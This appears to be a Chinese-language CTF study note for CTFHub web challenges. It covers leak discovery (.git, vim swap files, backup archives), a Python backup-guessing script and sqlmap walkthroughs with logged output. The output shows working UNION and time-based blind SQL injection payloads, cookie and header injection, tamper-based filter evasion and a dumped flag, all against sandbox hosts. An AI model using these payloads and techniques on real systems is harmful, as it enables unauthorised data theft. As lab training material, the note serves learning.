# 1. 网页目录

- `dirb`

- `gobuster`

- Apple `.DS_Store` 文件

  > - https://www.ctfhub.com/#/skilltree  /web/信息泄露/备份文件下载/.DS_Store

# 2. 编辑器（缓存）

`vim`: 当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当 vim 异常退出时，缓存会一直留在服务器上，引起网站源码泄露

> https://www.ctfhub.com/#/skilltree  /web/信息泄露/备份文件下载/vim缓存

e.g. vim 编辑 index.php，未保存退出，会导致原目录下出现 `.index.php.swp` 文件

# 3. 信息备份

当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露

**（1）常见的网站源码备份文件后缀**

------

- tar
- tar.gz
- zip
- rar

**（2）常见的网站源码备份文件名**

------

- web
- website
- backup
- back
- www
- wwwroot
- temp

> https://www.ctfhub.com/#/skilltree  /web/信息泄露/备份文件下载/网站源码
>
> https://www.ctfhub.com/#/skilltree  /web/信息泄露/备份文件下载/bak文件

⚠️ 指定文件名和后缀（全连接）最好自己写代码

e.g.

```python
import requests

# 指定文件名和后缀列表
file_names = ["web", "website", "backup", "back", "www", "wwwroot", "temp"]
extensions = [".tar",".tar.gz",".zip",".rar"]

# 目标URL
base_url = "http://challenge-b3016b8609053df5.sandbox.ctfhub.com:10800/"

# 循环遍历文件名和后缀进行全连接查找
for file_name in file_names:
    for extension in extensions:
        url = base_url + file_name + extension
        response = requests.get(url)

        if response.status_code == 200:
            print(f"Found: {url}")
```

# 4. git

> https://www.ctfhub.com/#/skilltree  /web/信息泄露/备份文件下载/Git泄露

https://github.com/BugScanTeam/GitHack

> ```python
> def method_a():
>     logger.info("Try to Clone straightly")
>     
> fatal: repository 'http://challenge-0f353c7e1e75f508.sandbox.ctfhub.com:10800/.git/' not found
> [-] Clone Error
>     
>     
> def method_b():
>     logger.info("Try to Clone with Directory Listing")
>     
> [*] http://challenge-0f353c7e1e75f508.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing
> [-] [Skip][First Try] Target is not support Directory Listing
>     
>     
> def method_c():
>     logger.info("Try to clone with Cache")
>     
> [+] Valid Repository Success
> [+] Clone Success. Dist File : /Applications/GitHack/dist/challenge-0f353c7e1e75f508.sandbox.ctfhub.com_10800
> 
> ```

当前大量开发人员使用 git 进行版本控制，对站点自动部署。如果配置不当，可能会将 .git 文件夹直接部署到线上环境，这就引起了 git 泄露漏洞。

```
// 查看提交历史
git log

// 版本回滚
git reset --hard 026fd758a67dbeecd1337cf91584468b6925bc20


// 发现 stash
git stash list
e.g.stash@{0}: WIP on master: 00de28e add flag

// 取出 stash
git stash pop


// 查看暂存区的状态
git status
e.g.On branch master
Changes not staged for commit:
  (use "git add <file>..." to update what will be committed)
  (use "git restore <file>..." to discard changes in working directory)
	modified:   243712490420488.txt
```

# 5. 默认口令

https://www.cnblogs.com/bflw/p/12938013.html

# 6. 注入（sqlmap）

> https://blog.csdn.net/m0_60651303/article/details/131704947
>
> https://www.ctfhub.com/#/skilltree  /web/SQL注入

```
探测等级

--level1：默认的等级，会进行基本的测试，包括 GET 和 POST 方式。
 
--level2: 在原有的基础上增加对 cookie 的检测。
 
--level3: 增加对 User Agent、Referer 的检测
 
--lever4: 更多的 payload
 
--level5: 最高等级，包含所有的 payload，会尝试自动破解出 cookie、xff 等头部注入。
```



```shell
Usage: python sqlmap.py [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs

  Request:
    These options can be used to specify how to connect to the target URL

    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --random-agent      Use randomly selected HTTP User-Agent header value
    --proxy=PROXY       Use a proxy to connect to the target URL
    --tor               Use Tor anonymity network
    --check-tor         Check to see if Tor is used properly

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    -p TESTPARAMETER    Testable parameter(s)
    --dbms=DBMS         Force back-end DBMS to provided value

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --passwords         Enumerate DBMS users password hashes
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC

  General:
    These options can be used to set some general working parameters

    --batch             Never ask for user input, use the default behavior
    --flush-session     Flush session files for current target

  Miscellaneous:
    These options do not fit into any other category

    --wizard            Simple wizard interface for beginner users
```

## GET

bp

```
GET /?id=1 HTTP/1.1
Host: challenge-58289ab9eb886e7d.sandbox.ctfhub.com:10800
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-58289ab9eb886e7d.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

url + 参数

```shell
python sqlmap.py "http://challenge-58289ab9eb886e7d.sandbox.ctfhub.com:10800/?id=1"
```

## POST

bp

```
POST /index.php HTTP/1.1
Host: challenge-52acc3f9cc322c2d.sandbox.ctfhub.com:10800
Content-Length: 30
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://challenge-52acc3f9cc322c2d.sandbox.ctfhub.com:10800
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-52acc3f9cc322c2d.sandbox.ctfhub.com:10800/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username=admin&password=123124
```

将抓包保存为 txt 文件，-r 表示加载一个文件，-p 指定参数

```shell
python sqlmap.py -r c:\1.txt -p username
```

## （1）数据库 `--dbs`

```shell
(venv) ➜  sqlmap git:(master) python sqlmap.py "http://challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com:10800/?id=1" --dbs

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:43:38 /2023-08-25/

[15:43:38] [INFO] testing connection to the target URL
[15:43:38] [INFO] testing if the target URL content is stable
[15:43:38] [INFO] target URL content is stable
[15:43:38] [INFO] testing if GET parameter 'id' is dynamic
[15:43:39] [WARNING] GET parameter 'id' does not appear to be dynamic
[15:43:39] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[15:43:39] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[15:43:39] [INFO] testing for SQL injection on GET parameter 'id'
[15:43:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:43:39] [WARNING] reflective value(s) found and filtering out
[15:43:40] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:43:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[15:43:40] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[15:43:41] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[15:43:41] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[15:43:41] [INFO] testing 'Generic inline queries'
[15:43:41] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[15:43:42] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[15:43:42] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[15:43:42] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[15:43:53] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
[15:43:57] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[15:43:57] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[15:43:58] [INFO] target URL appears to be UNION injectable with 2 columns
[15:43:59] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 80 HTTP(s) requests:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3202 FROM (SELECT(SLEEP(5)))YRbQ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2937 UNION ALL SELECT NULL,CONCAT(0x7176707071,0x6b6351537465477779424469434c4e4669796c6670694d4f504472585a737959596344736a4d794e,0x716b6a7a71)-- -
---
[15:44:10] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.19.3.2, PHP 7.3.14
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[15:44:10] [INFO] fetching database names
[15:44:10] [INFO] retrieved: 'information_schema'
[15:44:10] [INFO] retrieved: 'performance_schema'
[15:44:10] [INFO] retrieved: 'mysql'
[15:44:10] [INFO] retrieved: 'sqli'
available databases [4]:                                                                                                                                                   
[*] information_schema
[*] mysql
[*] performance_schema
[*] sqli

[15:44:10] [INFO] fetched data logged to text files under '/Users/xuyi/.local/share/sqlmap/output/challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com'
```

## （2）表 `--tables`

```shell
(venv) ➜  sqlmap git:(master) python sqlmap.py "http://challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:49:41 /2023-08-25/

[15:49:41] [INFO] resuming back-end DBMS 'mysql' 
[15:49:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3202 FROM (SELECT(SLEEP(5)))YRbQ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2937 UNION ALL SELECT NULL,CONCAT(0x7176707071,0x6b6351537465477779424469434c4e4669796c6670694d4f504472585a737959596344736a4d794e,0x716b6a7a71)-- -
---
[15:49:42] [INFO] the back-end DBMS is MySQL
web application technology: OpenResty 1.19.3.2, PHP 7.3.14
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[15:49:42] [INFO] fetching tables for database: 'sqli'
[15:49:42] [WARNING] reflective value(s) found and filtering out
[15:49:42] [INFO] retrieved: 'flag'
[15:49:42] [INFO] retrieved: 'news'
Database: sqli                                                                                                                                                             
[2 tables]
+------+
| flag |
| news |
+------+

[15:49:42] [INFO] fetched data logged to text files under '/Users/xuyi/.local/share/sqlmap/output/challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com'
```

## （3）列 `--columns`

```shell
(venv) ➜  sqlmap git:(master) python sqlmap.py "http://challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns
 
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:52:41 /2023-08-25/

[15:52:41] [INFO] resuming back-end DBMS 'mysql' 
[15:52:41] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3202 FROM (SELECT(SLEEP(5)))YRbQ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2937 UNION ALL SELECT NULL,CONCAT(0x7176707071,0x6b6351537465477779424469434c4e4669796c6670694d4f504472585a737959596344736a4d794e,0x716b6a7a71)-- -
---
[15:52:41] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.14, OpenResty 1.19.3.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[15:52:41] [INFO] fetching columns for table 'flag' in database 'sqli'
[15:52:41] [WARNING] reflective value(s) found and filtering out
Database: sqli
Table: flag
[1 column]
+--------+--------------+
| Column | Type         |
+--------+--------------+
| flag   | varchar(100) |
+--------+--------------+

[15:52:41] [INFO] fetched data logged to text files under '/Users/xuyi/.local/share/sqlmap/output/challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com'
```

## （4）内容 `--dump`

```shell
(venv) ➜  sqlmap git:(master) python sqlmap.py "http://challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag -C flag --dump
 
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:55:57 /2023-08-25/

[15:55:58] [INFO] resuming back-end DBMS 'mysql' 
[15:55:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3202 FROM (SELECT(SLEEP(5)))YRbQ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2937 UNION ALL SELECT NULL,CONCAT(0x7176707071,0x6b6351537465477779424469434c4e4669796c6670694d4f504472585a737959596344736a4d794e,0x716b6a7a71)-- -
---
[15:55:58] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.3.14, OpenResty 1.19.3.2
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[15:55:58] [INFO] fetching entries of column(s) 'flag' for table 'flag' in database 'sqli'
[15:55:58] [WARNING] reflective value(s) found and filtering out
Database: sqli
Table: flag
[1 entry]
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{2d1aecc0c65962091944063b} |
+----------------------------------+

[15:55:58] [INFO] table 'sqli.flag' dumped to CSV file '/Users/xuyi/.local/share/sqlmap/output/challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com/dump/sqli/flag.csv'
[15:55:58] [INFO] fetched data logged to text files under '/Users/xuyi/.local/share/sqlmap/output/challenge-7cd002cfce0bb7e2.sandbox.ctfhub.com'
```

## 其它选项

```shell
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] n

injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] n  // 默认情况下，SQLMap 使用逗号（,）作为 UNION 查询的列分隔符。然而，有些情况下目标数据库可能会对逗号进行限制或过滤，这会影响注入的成功率，通过设置 --union-char 参数，可以指定一个不受限制或过滤的字符来代替逗号作为 UNION 查询的列分隔符，例如，--union-char=1 将使用 ASCII 值为 1 的字符作为列分隔符

[16:16:31] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char' (e.g. '--union-char=1') and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 

[16:16:33] [INFO] target URL appears to be UNION injectable with 2 columns

injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] n

GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n

do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y  // 优化用于数据库延迟响应的时间值
```

😆 **盲注**是一个字母一个字母的挤出来的

## 进阶（`--level`, `--risk`, `--time-sec=2`）

### cookie

```shell
(venv) ➜  sqlmap git:(master) python sqlmap.py -u "http://challenge-6a38ed4519e03045.sandbox.ctfhub.com:10800" --cookie "id=1; hint=id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F" --level 2 --dbs

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:18:37 /2023-08-25/

[19:18:37] [INFO] testing connection to the target URL
[19:18:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:18:37] [INFO] testing if the target URL content is stable
[19:18:37] [INFO] target URL content is stable
[19:18:37] [INFO] testing if Cookie parameter 'id' is dynamic
do you want to URL encode cookie values (implementation specific)? [Y/n] y
[19:18:42] [INFO] Cookie parameter 'id' appears to be dynamic
[19:18:42] [WARNING] reflective value(s) found and filtering out
[19:18:42] [INFO] heuristic (basic) test shows that Cookie parameter 'id' might be injectable
[19:18:42] [INFO] heuristic (XSS) test shows that Cookie parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[19:18:42] [INFO] testing for SQL injection on Cookie parameter 'id'
[19:18:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:18:42] [INFO] Cookie parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[19:18:44] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (1) values? [Y/n] n
```

### UA/Refer 注入

```shell
(venv) ➜  sqlmap git:(master) python sqlmap.py -u "http://challenge-2fb3dbe4a07f0636.sandbox.ctfhub.com:10800" --level 3 --dbs
```

### 过滤空格

```shell
(venv) ➜  sqlmap git:(master) python sqlmap.py -u "http://challenge-96c2d3e8613433d1.sandbox.ctfhub.com:10800/?id=1" --dbs

[09:35:42] [WARNING] GET parameter 'id' does not seem to be injectable
[09:35:42] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'

当前测试的所有参数似乎都不容易受到 SQL 注入的影响。如果你希望进行更多的测试，可以尝试增加 --level 和 --risk 选项的值。如果你怀疑存在某种保护机制（例如 Web 应用防火墙），你可以尝试使用 --tamper 选项来进行混淆，也可以考虑使用 --random-agent 来模拟随机的 User-Agent。

脚本名： space2comment.py 
作用：Replaces space character  ' '  with comments   /**/
也就是用注释/**/替换空格字符' '

 sqlmap 中的 tamper 脚本有很多，例如： equaltolike.py （作用是用like代替等号）、 apostrophemask.py （作用是用utf8代替引号）、 greatest.py （作用是绕过过滤'>' ,用GREATEST替换大于号）等。
 
(venv) ➜  sqlmap git:(master) python sqlmap.py -u "http://challenge-96c2d3e8613433d1.sandbox.ctfhub.com:10800/?id=1" --dbs --tamper=space2comment --time-sec=2
```



